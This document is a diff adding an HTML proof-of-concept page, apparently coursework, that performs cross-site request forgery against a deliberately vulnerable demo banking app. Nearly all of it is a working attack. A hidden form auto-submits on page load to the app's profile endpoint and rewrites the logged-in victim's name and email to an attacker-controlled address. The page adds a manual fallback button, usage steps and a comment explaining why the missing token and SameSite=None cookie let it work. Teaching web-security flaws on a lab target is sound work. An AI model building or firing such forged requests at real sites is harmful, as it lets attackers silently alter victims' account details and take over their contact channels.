@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Aurelia Bank — CSRF Proof of Concept (academic demo)</title>
+<style>
+    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 3rem auto; line-height: 1.5; color: #222; }
+    .banner { background: #fee; border: 1px solid #c00; padding: 1rem; border-radius: 6px; }
+    code { background: #f2f2f2; padding: 0 4px; border-radius: 3px; }
+</style>
+</head>
+<body>
+    <div class="banner">
+        <strong>PROOF OF CONCEPT — academic coursework only.</strong><br>
+        This page demonstrates CSRF against <code>customer/profile.php</code> on the
+        deliberately-vulnerable Aurelia Bank demo app. It does nothing on its own —
+        it only fires if you already have an authenticated session with the target
+        site open in this same browser.
+    </div>
+
+    <h1>CSRF demo — "personal details" update</h1>
+    <p>
+        How to use this for the course demo:
+    </p>
+    <ol>
+        <li>In this browser, log in to
+            <code>https://aurelia-bank.infinityfree.io/auth/login.php</code>
+            as a customer (e.g. <code>jdoe</code>).</li>
+        <li>Keep that tab open (or just stay logged in), then open <em>this</em>
+            HTML file directly from disk in a <strong>new tab</strong> of the same
+            browser — this simulates the victim visiting an attacker-controlled
+            page while already logged in.</li>
+        <li>The form below submits itself automatically. If your browser blocks
+            the auto-submit, click the visible fallback button.</li>
+        <li>Go back to the profile page
+            (<code>https://aurelia-bank.infinityfree.io/customer/profile.php</code>)
+            and refresh — the full name and email have changed, even though you
+            never submitted that form yourself.</li>
+    </ol>
+
+    <!--
+        The real attack: a forged, auto-submitting cross-origin POST to the
+        victim's own banking site. No token is required because the profile
+        form has none, and the session cookie now carries SameSite=None, so
+        the browser attaches it to this cross-site request.
+    -->
+    <form id="csrf-form" method="POST"
+          action="https://aurelia-bank.infinityfree.io/customer/profile.php">
+        <input type="hidden" name="form" value="profile">
+        <input type="hidden" name="full_name" value="Compromised by CSRF PoC">
+        <input type="hidden" name="email" value="attacker-controlled@csrf-demo.test">
+        <input type="hidden" name="phone" value="">
+        <input type="hidden" name="address" value="">
+        <noscript>
+            <button type="submit">Submit forged request (JS disabled)</button>
+        </noscript>
+    </form>
+
+    <p>
+        <button onclick="document.getElementById('csrf-form').submit()">
+            Submit forged request manually
+        </button>
+    </p>
+
+    <script>
+        // Classic CSRF auto-submit — fires as soon as the page loads.
+        window.addEventListener('load', function () {
+            document.getElementById('csrf-form').submit();
+        });
+    </script>
+</body>
+</html>
